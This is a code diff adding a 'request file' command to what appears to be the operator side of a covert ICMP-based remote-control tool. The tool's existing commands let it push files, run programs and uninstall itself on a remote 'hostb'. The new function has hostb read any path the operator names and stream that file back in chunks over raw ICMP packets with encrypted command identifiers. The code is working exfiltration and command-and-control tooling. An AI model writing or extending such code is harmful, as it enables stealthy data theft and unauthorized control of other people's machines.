@@ -28,6 +28,7 @@ CMD_DISCONNECT = 1
 CMD_TRANSFER_FILE = 2
 CMD_UNINSTALL = 3
 CMD_RUN_PROGRAM = 4
+CMD_REQUEST_FILE = 5
 ACK_READY = 0xFFFE
 ACK_META = 0xFFFD
 ACK_CHUNK = 0xFFFC
@@ -55,6 +56,12 @@ CHUNK_RECV_TIMEOUT_SECONDS = 10.0            # per-attempt timeout receiving a c
 END_ACK_TIMEOUT_SECONDS = 3.0
 END_DRAIN_TIMEOUT_SECONDS = 3.0
 MAX_CHUNK_RETRIES = 5
+
+# File request: hostb reads file and streams back. Allow more time than command
+# output because hostb might have to read a multi-MB file from disk first.
+REQUESTED_FILE_TIMEOUT_SECONDS = 60.0
+RECEIVED_DIRECTORY = "received"
+RECEIVED_FALLBACK_NAME = "received_file"
 
 # Reserved sequence values for the transfer protocol.
 CHUNK_HEADER_SEQ = 0
@@ -815,6 +822,91 @@ def transfer_file(ctx: Context):
         send_socket.close()
 
 
+def request_file(ctx: Context):
+    if not ctx.connected:
+        print("Not connected. Use option 1 first.")
+        return
+
+    try:
+        remote_path = input("hostb file path> ").strip()
+    except (EOFError, KeyboardInterrupt):
+        print()
+        return
+    if not remote_path:
+        print("Request cancelled: no path given.")
+        return
+
+    path_bytes = remote_path.encode("utf-8")
+    if len(path_bytes) > MAX_FILENAME_BYTES:
+        print(f"Request failed: path too long ({len(path_bytes)} bytes).")
+        return
+
+    print(f"Requesting from hostb: {remote_path}")
+
+    try:
+        recv_socket = open_raw_icmp_recv_socket()
+        send_socket = open_raw_send_socket()
+    except PermissionError:
+        ctx.error_message = "permission denied (raw sockets require sudo)"
+        handle_error(ctx)
+
+    try:
+        # Phase A: request -> wait for ACK_READY.
+        try:
+            send_icmp_identifier(
+                send_socket, ctx.source_ip, ctx.destination_ip,
+                encrypt_identifier(CMD_REQUEST_FILE, ctx.key), 1,
+            )
+        except OSError as exc:
+            ctx.error_message = f"failed to send request: {exc}"
+            ctx.error_code = 2
+            handle_error(ctx)
+        print(f"Sent request (cmd={CMD_REQUEST_FILE}). Waiting for ready ack...")
+
+        if not wait_for_ack_ready(recv_socket, ctx.destination_ip, ctx.key,
+                                  READY_TIMEOUT_SECONDS):
+            print("Request failed: no ready ack from hostb.")
+            return
+        print("hostb is ready. Sending path...")
+
+        # Phase B: send the requested path as a byte stream.
+        if not send_byte_stream_chunked(send_socket, recv_socket,
+                                        ctx.source_ip, ctx.destination_ip,
+                                        ctx.key, path_bytes):
+            print("Request failed: path send aborted.")
+            return
+        print("Path sent. Waiting for file...")
+
+        # Phase C: receive the file bytes.
+        file_bytes = receive_byte_stream_chunked(
+            recv_socket, send_socket, ctx.source_ip, ctx.destination_ip,
+            ctx.key, REQUESTED_FILE_TIMEOUT_SECONDS,
+        )
+        if file_bytes is None:
+            print("Request failed: file receive aborted.")
+            return
+        if len(file_bytes) == 0:
+            print("Request failed: hostb reported the file is missing or unreadable.")
+            return
+
+        basename = os.path.basename(remote_path.replace("\\", "/"))
+        if not basename or basename in (".", "..") or "\x00" in basename:
+            basename = RECEIVED_FALLBACK_NAME
+        output_path = os.path.join(RECEIVED_DIRECTORY, basename)
+        try:
+            os.makedirs(RECEIVED_DIRECTORY, exist_ok=True)
+            with open(output_path, "wb") as f:
+                f.write(file_bytes)
+        except OSError as exc:
+            ctx.error_message = f"failed to write {output_path}: {exc}"
+            ctx.error_code = 2
+            handle_error(ctx)
+        print(f"Received {output_path} ({len(file_bytes)} bytes)")
+    finally:
+        recv_socket.close()
+        send_socket.close()
+
+
 def run_program(ctx: Context):
     if not ctx.connected:
         print("Not connected. Use option 1 first.")
@@ -918,10 +1010,13 @@ if __name__ == "__main__":
         elif choice == "4":
             print("\nTransferring file to hostb...")
             transfer_file(ctx)
+        elif choice == "5":
+            print("\nRequesting file from hostb...")
+            request_file(ctx)
         elif choice == "8":
             print("\nRunning program on hostb...")
             run_program(ctx)
-        elif choice in {"5", "6", "7"}:
+        elif choice in {"6", "7"}:
             print("Not implemented yet.")
         else:
             print("Invalid choice.")
